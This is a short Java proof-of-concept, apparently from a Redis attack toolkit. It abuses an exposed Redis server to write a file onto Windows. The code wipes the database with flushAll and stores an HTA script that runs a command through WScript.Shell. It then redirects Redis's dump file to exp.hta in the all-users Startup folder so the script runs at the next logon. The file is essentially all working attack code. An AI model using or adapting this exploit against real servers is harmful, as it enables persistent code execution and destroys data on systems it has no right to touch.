package cn.b1ue.redis.filewrite.win;

import redis.clients.jedis.Jedis;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/2 20:10
 */
public class StartUp {

    public static void main(String[] args) {
        Jedis jedis = new Jedis("127.0.0.1", 6379);
        jedis.flushAll();
        jedis.set("x", "<SCRIPT Language=\"JScript\">new ActiveXObject(\"WScript.Shell\").run(\"calc.exe\");</SCRIPT>\n");
        jedis.configSet("dir","C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
        jedis.configSet("dbfilename","exp.hta");
        jedis.save();

        jedis.close();

    }

}
